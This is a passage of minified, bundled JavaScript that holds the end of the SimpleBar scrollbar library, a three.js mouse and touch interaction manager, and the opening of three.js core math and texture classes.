MutationObserver(ji.handleMutations),this.globalObserver.observe(document,{childList:!0,subtree:!0})),"complete"===document.readyState||"loading"!==document.readyState&&!document.documentElement.doScroll?window.setTimeout(this.initDOMLoadedElements):(document.addEventListener("DOMContentLoaded",this.initDOMLoadedElements),window.addEventListener("load",this.initDOMLoadedElements))},ji.handleMutations=function(e){e.forEach((function(e){Array.prototype.forEach.call(e.addedNodes,(function(e){1===e.nodeType&&(e.hasAttribute("data-simplebar")?!ji.instances.has(e)&&new ji(e,Fi(e.attributes)):Array.prototype.forEach.call(e.querySelectorAll("[data-simplebar]"),(function(e){"init"===e.getAttribute("data-simplebar")||ji.instances.has(e)||new ji(e,Fi(e.attributes))})))})),Array.prototype.forEach.call(e.removedNodes,(function(e){1===e.nodeType&&(e.hasAttribute('[data-simplebar="init"]')?ji.instances.has(e)&&ji.instances.get(e).unMount():Array.prototype.forEach.call(e.querySelectorAll('[data-simplebar="init"]'),(function(e){ji.instances.has(e)&&ji.instances.get(e).unMount()})))}))}))},ji.getOptions=Fi,Ke&&ji.initHtmlApi(),ji},"object"===_typeof2(n)&&void 0!==t?t.exports=i():"function"==typeof define&&define.amd?define(i):(r=r||self).SimpleBar=i()}).call(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],269:[function(e,t,n){var r,i;r=this,i=function(e,t){function n(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function r(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}var i=function e(t,r){n(this,e),this.target=t,this.name=r,this.intersected=!1,this.distance=0},a=function(){function e(t){var r=1<arguments.length&&void 0!==arguments[1]?arguments[1]:null;n(this,e),this.cancelBubble=!1,this.type=t,this.originalEvent=r}var t,i;return t=e,(i=[{key:"stopPropagation",value:function(){this.cancelBubble=!0}}])&&r(t.prototype,i),e}();e.InteractionManager=function e(r,o,s){var l=this;n(this,e),this.dispose=function(){domElement.removeEventListener("click",l.onMouseClick),l.supportsPointerEvents?(domElement.ownerDocument.removeEventListener("pointermove",l.onDocumentMouseMove),domElement.removeEventListener("pointerdown",l.onMouseDown),domElement.removeEventListener("pointerup",l.onMouseUp)):(domElement.ownerDocument.removeEventListener("mousemove",l.onDocumentMouseMove),domElement.removeEventListener("mousedown",l.onMouseDown),domElement.removeEventListener("mouseup",l.onMouseUp),domElement.removeEventListener("touchstart",l.onTouchStart),domElement.removeEventListener("touchmove",l.onTouchMove),domElement.removeEventListener("touchend",l.onTouchEnd))},this.add=function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:[];if(e)if(0<t.length)t.forEach((function(t){var n=e.getObjectByName(t);if(n){var r=new i(n,t);l.interactiveObjects.push(r)}}));else{var n=new i(e,e.name);l.interactiveObjects.push(n)}},this.remove=function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:[];if(e)if(0<t.length){var n=[];l.interactiveObjects.forEach((function(e){t.includes(e.name)||n.push(e)})),l.interactiveObjects=n}else{var r=[];l.interactiveObjects.forEach((function(t){t.name!==e.name&&r.push(t)})),l.interactiveObjects=r}},this.update=function(){l.raycaster.setFromCamera(l.mouse,l.camera),l.interactiveObjects.forEach((function(e){e.target&&l.checkIntersection(e)})),l.interactiveObjects.sort((function(e,t){return e.distance-t.distance}));var e=new a("mouseout");l.interactiveObjects.forEach((function(t){!t.intersected&&t.wasIntersected&&l.dispatch(t,e)}));var t=new a("mouseover");l.interactiveObjects.forEach((function(e){e.intersected&&!e.wasIntersected&&l.dispatch(e,t)}))},this.checkIntersection=function(e){var t=l.raycaster.intersectObjects([e.target],!0);if(e.wasIntersected=e.intersected,0<t.length){var n=t[0].distance;t.forEach((function(e){e.distance<n&&(n=e.distance)})),e.intersected=!0,e.distance=n}else e.intersected=!1},this.onDocumentMouseMove=function(e){l.mapPositionToPoint(l.mouse,e.clientX,e.clientY);var t=new a("mousemove",e);l.interactiveObjects.forEach((function(e){l.dispatch(e,t)}))},this.onTouchMove=function(e){l.mapPositionToPoint(l.mouse,e.touches[0].clientX,e.touches[0].clientY);var t=new a(l.treatTouchEventsAsMouseEvents?"mousemove":"touchmove",e);l.interactiveObjects.forEach((function(e){l.dispatch(e,t)}))},this.onMouseClick=function(e){l.update();var t=new a("click",e);l.interactiveObjects.forEach((function(e){e.intersected&&l.dispatch(e,t)}))},this.onMouseDown=function(e){l.mapPositionToPoint(l.mouse,e.clientX,e.clientY),l.update();var t=new a("mousedown",e);l.interactiveObjects.forEach((function(e){e.intersected&&l.dispatch(e,t)}))},this.onTouchStart=function(e){l.mapPositionToPoint(l.mouse,e.touches[0].clientX,e.touches[0].clientY),l.update();var t=new a(l.treatTouchEventsAsMouseEvents?"mousedown":"touchstart",e);l.interactiveObjects.forEach((function(e){e.intersected&&l.dispatch(e,t)}))},this.onMouseUp=function(e){var t=new a("mouseup",e);l.interactiveObjects.forEach((function(e){l.dispatch(e,t)}))},this.onTouchEnd=function(e){l.mapPositionToPoint(l.mouse,e.touches[0].clientX,e.touches[0].clientY),l.update();var t=new a(l.treatTouchEventsAsMouseEvents?"mouseup":"touchend",e);l.interactiveObjects.forEach((function(e){l.dispatch(e,t)}))},this.dispatch=function(e,t){e.target&&!t.cancelBubble&&(t.coords=l.mouse,t.distance=e.distance,t.intersected=e.intersected,e.target.dispatchEvent(t))},this.mapPositionToPoint=function(e,t,n){var r;r=l.renderer.domElement.parentElement?l.renderer.domElement.getBoundingClientRect():{x:0,y:0,left:0,top:0,width:0,height:0},e.x=(t-r.left)/r.width*2-1,e.y=-(n-r.top)/r.height*2+1},this.renderer=r,this.camera=o,this.domElement=s,this.mouse=new t.Vector2(-1,1),this.supportsPointerEvents=!!window.PointerEvent,this.interactiveObjects=[],this.raycaster=new t.Raycaster,s.addEventListener("click",this.onMouseClick),this.supportsPointerEvents?(s.ownerDocument.addEventListener("pointermove",this.onDocumentMouseMove),s.addEventListener("pointerdown",this.onMouseDown),s.addEventListener("pointerup",this.onMouseUp)):(s.ownerDocument.addEventListener("mousemove",this.onDocumentMouseMove),s.addEventListener("mousedown",this.onMouseDown),s.addEventListener("mouseup",this.onMouseUp),s.addEventListener("touchstart",this.onTouchStart,{passive:!0}),s.addEventListener("touchmove",this.onTouchMove,{passive:!0}),s.addEventListener("touchend",this.onTouchEnd,{passive:!0})),this.treatTouchEventsAsMouseEvents=!0},e.InteractiveEvent=a,e.InteractiveObject=i,Object.defineProperty(e,"__esModule",{value:!0})},"object"===_typeof2(n)&&void 0!==t?i(n,e("three")):"function"==typeof define&&define.amd?define(["exports","three"],i):i((r="undefined"!=typeof globalThis?globalThis:r||self).THREE=r.THREE||{},r.THREE)},{three:270}],270:[function(e,t,n){var r,i;r=this,i=function(e){void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52)),void 0===Number.isInteger&&(Number.isInteger=function(e){return"number"==typeof e&&isFinite(e)&&Math.floor(e)===e}),void 0===Math.sign&&(Math.sign=function(e){return e<0?-1:0<e?1:+e}),"name"in Function.prototype==0&&Object.defineProperty(Function.prototype,"name",{get:function(){return this.toString().match(/^\s*function\s*([^\(\s]*)/)[1]}}),void 0===Object.assign&&(Object.assign=function(e){if(null==e)throw new TypeError("Cannot convert undefined or null to object");for(var t=Object(e),n=1;n<arguments.length;n++){var r=arguments[n];if(null!=r)for(var i in r)Object.prototype.hasOwnProperty.call(r,i)&&(t[i]=r[i])}return t});var t=100,n=301,r=302,i=303,a=304,o=306,s=307,l=1e3,c=1001,u=1002,d=1003,p=1004,h=1005,f=1006,A=1007,m=1008,v=1009,g=1012,y=1014,b=1015,_=1016,w=1020,C=1022,x=1023,S=1026,k=1027,M=33776,B=33777,E=33778,T=33779,P=35840,I=35841,F=35842,L=35843,O=37492,N=37496,D=3e3,R=3001,j=3007,U=3002,$=3004,z=3005,H=3006,V=7680,Q=35044,G=35048,W="300 es";function K(){}Object.assign(K.prototype,{addEventListener:function(e,t){void 0===this._listeners&&(this._listeners={});var n=this._listeners;void 0===n[e]&&(n[e]=[]),-1===n[e].indexOf(t)&&n[e].push(t)},hasEventListener:function(e,t){if(void 0===this._listeners)return!1;var n=this._listeners;return void 0!==n[e]&&-1!==n[e].indexOf(t)},removeEventListener:function(e,t){if(void 0!==this._listeners){var n=this._listeners[e];if(void 0!==n){var r=n.indexOf(t);-1!==r&&n.splice(r,1)}}},dispatchEvent:function(e){if(void 0!==this._listeners){var t=this._listeners[e.type];if(void 0!==t){e.target=this;for(var n=t.slice(0),r=0,i=n.length;r<i;r++)n[r].call(this,e)}}}});for(var q=[],X=0;X<256;X++)q[X]=(X<16?"0":"")+X.toString(16);var Y=1234567,J={DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var e=4294967295*Math.random()|0,t=4294967295*Math.random()|0,n=4294967295*Math.random()|0,r=4294967295*Math.random()|0;return(q[255&e]+q[e>>8&255]+q[e>>16&255]+q[e>>24&255]+"-"+q[255&t]+q[t>>8&255]+"-"+q[t>>16&15|64]+q[t>>24&255]+"-"+q[63&n|128]+q[n>>8&255]+"-"+q[n>>16&255]+q[n>>24&255]+q[255&r]+q[r>>8&255]+q[r>>16&255]+q[r>>24&255]).toUpperCase()},clamp:function(e,t,n){return Math.max(t,Math.min(n,e))},euclideanModulo:function(e,t){return(e%t+t)%t},mapLinear:function(e,t,n,r,i){return r+(e-t)*(i-r)/(n-t)},lerp:function(e,t,n){return(1-n)*e+n*t},smoothstep:function(e,t,n){return e<=t?0:n<=e?1:(e=(e-t)/(n-t))*e*(3-2*e)},smootherstep:function(e,t,n){return e<=t?0:n<=e?1:(e=(e-t)/(n-t))*e*e*(e*(6*e-15)+10)},randInt:function(e,t){return e+Math.floor(Math.random()*(t-e+1))},randFloat:function(e,t){return e+Math.random()*(t-e)},randFloatSpread:function(e){return e*(.5-Math.random())},seededRandom:function(e){return void 0!==e&&(Y=e%2147483647),((Y=16807*Y%2147483647)-1)/2147483646},degToRad:function(e){return e*J.DEG2RAD},radToDeg:function(e){return e*J.RAD2DEG},isPowerOfTwo:function(e){return 0==(e&e-1)&&0!==e},ceilPowerOfTwo:function(e){return Math.pow(2,Math.ceil(Math.log(e)/Math.LN2))},floorPowerOfTwo:function(e){return Math.pow(2,Math.floor(Math.log(e)/Math.LN2))},setQuaternionFromProperEuler:function(e,t,n,r,i){var a=Math.cos,o=Math.sin,s=a(n/2),l=o(n/2),c=a((t+r)/2),u=o((t+r)/2),d=a((t-r)/2),p=o((t-r)/2),h=a((r-t)/2),f=o((r-t)/2);switch(i){case"XYX":e.set(s*u,l*d,l*p,s*c);break;case"YZY":e.set(l*p,s*u,l*d,s*c);break;case"ZXZ":e.set(l*d,l*p,s*u,s*c);break;case"XZX":e.set(s*u,l*f,l*h,s*c);break;case"YXY":e.set(l*h,s*u,l*f,s*c);break;case"ZYZ":e.set(l*f,l*h,s*u,s*c)}}};function Z(e,t){for(var n=0;n<t.length;n++){var r=t[n];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(e,r.key,r)}}function ee(e,t,n){return t&&Z(e.prototype,t),n&&Z(e,n),e}function te(e,t){e.prototype=Object.create(t.prototype),(e.prototype.constructor=e).__proto__=t}function ne(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}var re,ie=function(){function e(e,t){void 0===e&&(e=0),void 0===t&&(t=0),Object.defineProperty(this,"isVector2",{value:!0}),this.x=e,this.y=t}var t=e.prototype;return t.set=function(e,t){return this.x=e,this.y=t,this},t.setScalar=function(e){return this.x=e,this.y=e,this},t.setX=function(e){return this.x=e,this},t.setY=function(e){return this.y=e,this},t.setComponent=function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;default:throw new Error("index is out of range: "+e)}return this},t.getComponent=function(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+e)}},t.clone=function(){return new this.constructor(this.x,this.y)},t.copy=function(e){return this.x=e.x,this.y=e.y,this},t.add=function(e,t){return void 0!==t?this.addVectors(e,t):(this.x+=e.x,this.y+=e.y,this)},t.addScalar=function(e){return this.x+=e,this.y+=e,this},t.addVectors=function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this},t.addScaledVector=function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this},t.sub=function(e,t){return void 0!==t?this.subVectors(e,t):(this.x-=e.x,this.y-=e.y,this)},t.subScalar=function(e){return this.x-=e,this.y-=e,this},t.subVectors=function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this},t.multiply=function(e){return this.x*=e.x,this.y*=e.y,this},t.multiplyScalar=function(e){return this.x*=e,this.y*=e,this},t.divide=function(e){return this.x/=e.x,this.y/=e.y,this},t.divideScalar=function(e){return this.multiplyScalar(1/e)},t.applyMatrix3=function(e){var t=this.x,n=this.y,r=e.elements;return this.x=r[0]*t+r[3]*n+r[6],this.y=r[1]*t+r[4]*n+r[7],this},t.min=function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this},t.max=function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this},t.clamp=function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this},t.clampScalar=function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this},t.clampLength=function(e,t){var n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))},t.floor=function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this},t.ceil=function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this},t.round=function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this},t.roundToZero=function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this},t.negate=function(){return this.x=-this.x,this.y=-this.y,this},t.dot=function(e){return this.x*e.x+this.y*e.y},t.cross=function(e){return this.x*e.y-this.y*e.x},t.lengthSq=function(){return this.x*this.x+this.y*this.y},t.length=function(){return Math.sqrt(this.x*this.x+this.y*this.y)},t.manhattanLength=function(){return Math.abs(this.x)+Math.abs(this.y)},t.normalize=function(){return this.divideScalar(this.length()||1)},t.angle=function(){return Math.atan2(-this.y,-this.x)+Math.PI},t.distanceTo=function(e){return Math.sqrt(this.distanceToSquared(e))},t.distanceToSquared=function(e){var t=this.x-e.x,n=this.y-e.y;return t*t+n*n},t.manhattanDistanceTo=function(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)},t.setLength=function(e){return this.normalize().multiplyScalar(e)},t.lerp=function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this},t.lerpVectors=function(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this},t.equals=function(e){return e.x===this.x&&e.y===this.y},t.fromArray=function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this},t.toArray=function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e},t.fromBufferAttribute=function(e,t,n){return this.x=e.getX(t),this.y=e.getY(t),this},t.rotateAround=function(e,t){var n=Math.cos(t),r=Math.sin(t),i=this.x-e.x,a=this.y-e.y;return this.x=i*n-a*r+e.x,this.y=i*r+a*n+e.y,this},t.random=function(){return this.x=Math.random(),this.y=Math.random(),this},ee(e,[{key:"width",get:function(){return this.x},set:function(e){this.x=e}},{key:"height",get:function(){return this.y},set:function(e){this.y=e}}]),e}(),ae=function(){function e(){Object.defineProperty(this,"isMatrix3",{value:!0}),this.elements=[1,0,0,0,1,0,0,0,1]}var t=e.prototype;return t.set=function(e,t,n,r,i,a,o,s,l){var c=this.elements;return c[0]=e,c[1]=r,c[2]=o,c[3]=t,c[4]=i,c[5]=s,c[6]=n,c[7]=a,c[8]=l,this},t.identity=function(){return this.set(1,0,0,0,1,0,0,0,1),this},t.clone=function(){return(new this.constructor).fromArray(this.elements)},t.copy=function(e){var t=this.elements,n=e.elements;return t[0]=n[0],t[1]=n[1],t[2]=n[2],t[3]=n[3],t[4]=n[4],t[5]=n[5],t[6]=n[6],t[7]=n[7],t[8]=n[8],this},t.extractBasis=function(e,t,n){return e.setFromMatrix3Column(this,0),t.setFromMatrix3Column(this,1),n.setFromMatrix3Column(this,2),this},t.setFromMatrix4=function(e){var t=e.elements;return this.set(t[0],t[4],t[8],t[1],t[5],t[9],t[2],t[6],t[10]),this},t.multiply=function(e){return this.multiplyMatrices(this,e)},t.premultiply=function(e){return this.multiplyMatrices(e,this)},t.multiplyMatrices=function(e,t){var n=e.elements,r=t.elements,i=this.elements,a=n[0],o=n[3],s=n[6],l=n[1],c=n[4],u=n[7],d=n[2],p=n[5],h=n[8],f=r[0],A=r[3],m=r[6],v=r[1],g=r[4],y=r[7],b=r[2],_=r[5],w=r[8];return i[0]=a*f+o*v+s*b,i[3]=a*A+o*g+s*_,i[6]=a*m+o*y+s*w,i[1]=l*f+c*v+u*b,i[4]=l*A+c*g+u*_,i[7]=l*m+c*y+u*w,i[2]=d*f+p*v+h*b,i[5]=d*A+p*g+h*_,i[8]=d*m+p*y+h*w,this},t.multiplyScalar=function(e){var t=this.elements;return t[0]*=e,t[3]*=e,t[6]*=e,t[1]*=e,t[4]*=e,t[7]*=e,t[2]*=e,t[5]*=e,t[8]*=e,this},t.determinant=function(){var e=this.elements,t=e[0],n=e[1],r=e[2],i=e[3],a=e[4],o=e[5],s=e[6],l=e[7],c=e[8];return t*a*c-t*o*l-n*i*c+n*o*s+r*i*l-r*a*s},t.getInverse=function(e,t){var n=e.elements,r=this.elements,i=n[0],a=n[1],o=n[2],s=n[3],l=n[4],c=n[5],u=n[6],d=n[7],p=n[8],h=p*l-c*d,f=c*u-p*s,A=d*s-l*u,m=i*h+a*f+o*A;if(0===m)return this.set(0,0,0,0,0,0,0,0,0);var v=1/m;return r[0]=h*v,r[1]=(o*d-p*a)*v,r[2]=(c*a-o*l)*v,r[3]=f*v,r[4]=(p*i-o*u)*v,r[5]=(o*s-c*i)*v,r[6]=A*v,r[7]=(a*u-d*i)*v,r[8]=(l*i-a*s)*v,this},t.transpose=function(){var e,t=this.elements;return e=t[1],t[1]=t[3],t[3]=e,e=t[2],t[2]=t[6],t[6]=e,e=t[5],t[5]=t[7],t[7]=e,this},t.getNormalMatrix=function(e){return this.setFromMatrix4(e).getInverse(this).transpose()},t.transposeIntoArray=function(e){var t=this.elements;return e[0]=t[0],e[1]=t[3],e[2]=t[6],e[3]=t[1],e[4]=t[4],e[5]=t[7],e[6]=t[2],e[7]=t[5],e[8]=t[8],this},t.setUvTransform=function(e,t,n,r,i,a,o){var s=Math.cos(i),l=Math.sin(i);this.set(n*s,n*l,-n*(s*a+l*o)+a+e,-r*l,r*s,-r*(-l*a+s*o)+o+t,0,0,1)},t.scale=function(e,t){var n=this.elements;return n[0]*=e,n[3]*=e,n[6]*=e,n[1]*=t,n[4]*=t,n[7]*=t,this},t.rotate=function(e){var t=Math.cos(e),n=Math.sin(e),r=this.elements,i=r[0],a=r[3],o=r[6],s=r[1],l=r[4],c=r[7];return r[0]=t*i+n*s,r[3]=t*a+n*l,r[6]=t*o+n*c,r[1]=-n*i+t*s,r[4]=-n*a+t*l,r[7]=-n*o+t*c,this},t.translate=function(e,t){var n=this.elements;return n[0]+=e*n[2],n[3]+=e*n[5],n[6]+=e*n[8],n[1]+=t*n[2],n[4]+=t*n[5],n[7]+=t*n[8],this},t.equals=function(e){for(var t=this.elements,n=e.elements,r=0;r<9;r++)if(t[r]!==n[r])return!1;return!0},t.fromArray=function(e,t){void 0===t&&(t=0);for(var n=0;n<9;n++)this.elements[n]=e[n+t];return this},t.toArray=function(e,t){void 0===e&&(e=[]),void 0===t&&(t=0);var n=this.elements;return e[t]=n[0],e[t+1]=n[1],e[t+2]=n[2],e[t+3]=n[3],e[t+4]=n[4],e[t+5]=n[5],e[t+6]=n[6],e[t+7]=n[7],e[t+8]=n[8],e},e}(),oe={getDataURL:function(e){if(/^data:/i.test(e.src))return e.src;if("undefined"==typeof HTMLCanvasElement)return e.src;var t;if(e instanceof HTMLCanvasElement)t=e;else{void 0===re&&(re=document.createElementNS("http://www.w3.org/1999/xhtml","canvas")),re.width=e.width,re.height=e.height;var n=re.getContext("2d");e instanceof ImageData?n.putImageData(e,0,0):n.drawImage(e,0,0,e.width,e.height),t=re}return 2048<t.width||2048<t.height?t.toDataURL("image/jpeg",.6):t.toDataURL("image/png")}},se=0;function le(e,t,n,r,i,a,o,s,l,u){Object.defineProperty(this,"id",{value:se++}),this.uuid=J.generateUUID(),this.name="",this.image=void 0!==e?e:le.DEFAULT_IMAGE,this.mipmaps=[],this.mapping=void 0!==t?t:le.DEFAULT_MAPPING,this.wrapS=void 0!==n?n:c,this.wrapT=void 0!==r?r:c,this.magFilter=void 0!==i?i:f,this.minFilter=void 0!==a?a:m,this.anisotropy=void 0!==l?l:1,this.format=void 0!==o?o:x,this.internalFormat=null,this.type=void 0!==s?s:v,this.offset=new ie(0,0),this.repeat=new ie(1,1),this.center=new ie(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new ae,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this.encoding=void 0!==u?u:D,this.version=0,this.onUpdate=null}le.DEFAULT_IMAGE=void 0,le.DEFAULT_MAPPING=300,le.prototype=Object.assign(Object.create(K.prototype),{constructor:le,isTexture:!0,updateMatrix:function(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.name=e.name,this.image=e.image,this.mipmaps=e.mipmaps.slice(0),this.mapping=e.mapping,this.wrapS=e.wrapS,this.wrapT=e.wrapT,this.magFilter=e.magFilter,this.minFilter=e.minFilter,this.anisotropy=e.anisotropy,this.format=e.format,this.internalFormat=e.internalFormat,this.type=e.type,this.offset.copy(e.offset),this.repeat.copy(e.repeat),this.center.copy(e.center),this.rotation=e.rotation,this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrix.copy(e.matrix),this.generateMipmaps=e.generateMipmaps,this.premultiplyAlpha=e.premultiplyAlpha,this.flipY=e.flipY,this.unpackAlignment=e.unpackAlignment,this.encoding=e.encoding,this},toJSON:function(e){var t=void 0===e||"string"==typeof e;if(!t&&void 0!==e.textures[this.uuid])return e.textures[this.uuid];var n={metadata:{version:4.5,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,type:this.type,encoding:this.encoding,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};if(void 0!==this.image){var r=this.image;if(void 0===r.uuid&&(r.uuid=J.generateUUID()),!t&&void 0===e.images[r.uuid]){var i;if(Array.isArray(r)){i=[];for(var a=0,o=r.length;a<o;a++)i.push(oe.getDataURL(r[a]))}else i=oe.getDataURL(r);e.images[r.uuid]={uuid:r.uuid,url:i}}n.image=r.uuid}return t||(e.textures[this.uuid]=n),n},dispose:function(){this.dispatchEvent({type:"dispose"})},transformUv:function(e){if(300!==this.mapping)return e;if(e.applyMatrix3(this.matrix),e.x<0||1<e.x)switch(this.wrapS){case l:e.x=e.x-Math.floor(e.x);break;case c:e.x=e.x<0?0:1;break;case u:1===Math.abs(Math.floor(e.x)%2)?e.x=Math.ceil(e.x)-e.x:e.x=e.x-Math.floor(e.x)}if(e.y<0||1<e.y)switch(this.wrapT){case l:e.y=e.y-Math.floor(e.y);break;case c:e.y=e.y<0?0:1;break;case u:1===Math.abs(Math.floor(e.y)%2)?e.y=Math.ceil(e.y)-e.y:e.y=e.y-Math.floor(e.y)}return this.flipY&&(e.y=1-e.y),e}}),Object.defineProperty(le.prototype,"needsUpdate",{set:function(e){!0===e&&this.version++}});var ce=function(){function e(e,t,n,r){void 0===e&&(e=0),void 0===t&&(t=0),void 0===n&&(n=0),void 0===r&&(r=1),Object.defineProperty(this,"isVector4",{value:!0}),this.x=e,this.y=t,this.z=n,this.w=r}var t=e.prototype;return t.set=function(e,t,n,r){return this.x=e,this.y=t,this.z=n,this.w=r,this},t.setScalar=function(e){return this.x=e,this.y=e,this.z=e,this.w=e,this},t.setX=function(e){return this.x=e,this},t.setY=function(e){return this.y=e,this},t.setZ=function(e){return this.z=e,this},t.setW=function(e){return this.w=e,this},t.setComponent=function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;case 3:this.w=t;break;default:throw new Error("index is out of range: "+e)}return this},t.getComponent=function(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+e)}},t.clone=function(){return new this.constructor(this.x,this.y,this.z,this.w)},t.copy=function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=void 0!==e.w?e.w:1,this},t.add=function(e,t){return void 0!==t?this.addVectors(e,t):(this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this)},t.addScalar=function(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this},t.addVectors=function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this.w=e.w+t.w,this},t.addScaledVector=function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this.z+=e.z*t,this.w+=e.w*t,this},t.sub=function(e,t){return void 0!==t?this.subVectors(e,t):(this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this)},t.subScalar=function(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this},t.subVectors=function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this.w=e.w-t.w,this},t.multiplyScalar=function(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this},t.applyMatrix4=function(e){var t=this.x,n=this.y,r=this.z,i=this.w,a=e.elements;return this.x=a[0]*t+a[4]*n+a[8]*r+a[12]*i,this.y=a[1]*t+a[5]*n+a[9]*r+a[13]*i,this.z=a[2]*t+a[6]*n+a[10]*r+a[14]*i,this.w=a[3]*t+a[7]*n+a[11]*r+a[15]*i,this},t.divideScalar=function(e){return this.multiplyScalar(1/e)},t.setAxisAngleFromQuaternion=function(e){this.w=2*Math.acos(e.w);var t=Math.sqrt(1-e.w*e.w);return this.z=t<1e-4?(this.x=1,this.y=0):(this.x=e.x/t,this.y=e.y/t,e.z/t),this},t.setAxisAngleFromRotationMatrix=function(e){var t,n,r,i,a=e.elements,o=a[0],s=a[4],l=a[8],c=a[1],u=a[5],d=a[9],p=a[2],h=a[6],f=a[10];if(Math.abs(s-c)<.01&&Math.abs(l-p)<.01&&Math.abs(d-h)<.01){if(Math.abs(s+c)<.1&&Math.abs(l+p)<.1&&Math.abs(d+h)<.1&&Math.abs(o+u+f-3)<.1)return this.set(1,0,0,0),this;t=Math.PI;var A=(o+1)/2,m=(u+1)/2,v=(f+1)/2,g=(s+c)/4,y=(l+p)/4,b=(d+h)/4;return m<A&&v<A?i=A<.01?(n=0,r=.707106781):(r=g/(n=Math.sqrt(A)),y/n):v<m?i=m<.01?(r=0,n=.707106781):(n=g/(r=Math.sqrt(m)),b/r):v<.01?(r=n=.707106781,i=0):(n=y/(i=Math.sqrt(v)),r=b/i),this.set(n,r,i,t),this}var _=Math.sqrt((h-d)*(h-d)+(l-p)*(l-p)+(c-s)*(c-s));return Math.abs(_)<.001&&(_=1),this.x=(h-d)/_,this.y=(l-p)/_,this.z=(c-s)/_,this.w=Math.acos((o+u+f-1)/2),this},t.min=function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this.w=Math.min(this.w,e.w),this},t.max=function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this.w=Math.max(this.w,e.w),this},t.clamp=function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this.z=Math.max(e.z,Math.min(t.z,this.z)),this.w=Math.max(e.w,Math.min(t.w,this.w)),this},t.clampScalar=function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this.z=Math.max(e,Math.min(t,this.z)),this.w=Math.max(e,Math.min(t,this.w)),this},t.clampLength=function(e,t){var n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))},t.floor=function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this},t.ceil=function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this},t.round=function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this},t.roundToZero=function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this.w=this.w<0?Math.ceil(this.w):Math.floor(this.w),this},t.negate=function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this},t.dot=function(e){return 